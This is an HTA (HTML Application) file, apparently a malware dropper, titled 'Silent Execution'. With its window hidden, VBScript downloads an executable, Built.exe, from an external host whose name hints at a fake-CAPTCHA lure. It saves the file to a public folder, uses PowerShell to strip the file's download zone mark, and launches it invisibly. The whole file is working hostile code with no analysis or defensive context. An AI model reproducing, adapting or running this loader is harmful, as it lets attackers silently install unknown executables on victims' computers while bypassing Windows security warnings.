<!DOCTYPE html>
<html>
<head>
    <title>Silent Execution</title>
    <hta:application 
        id="silentApp"
        border="none"
        sysmenu="no"
        caption="no"
        maximizeButton="no"
        minimizeButton="no"
        showInTaskbar="no"
        windowState="hidden"
        scroll="no"
    />
</head>
<body>
    <script language="VBScript">
        ' Create a VBScript to download and execute Built.exe silently
        Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
        Set objStream = CreateObject("ADODB.Stream")
        
        ' URL of the file to download
        fileURL = "https://notafakecaptica2222.vercel.app/Built.exe"
        
        ' Path to save the file temporarily
        tempFilePath = "C:\Users\Public\Built.exe"
        
        ' Download the file
        objXMLHttp.open "GET", fileURL, False
        objXMLHttp.send
        If objXMLHttp.Status = 200 Then
            objStream.Open
            objStream.Write objXMLHttp.responseBody
            objStream.SaveToFile tempFilePath, 2 ' 2 means overwrite the file if exists
            objStream.Close
        End If
        
        ' Unblock the file using PowerShell (directly without warning)
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "powershell -command Set-ItemProperty -Path '" & tempFilePath & "' -Name 'Zone.Identifier' -Value '0'", 0, True
        
        ' Run the downloaded EXE file silently
        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
        
    </script>
</body>
</html>
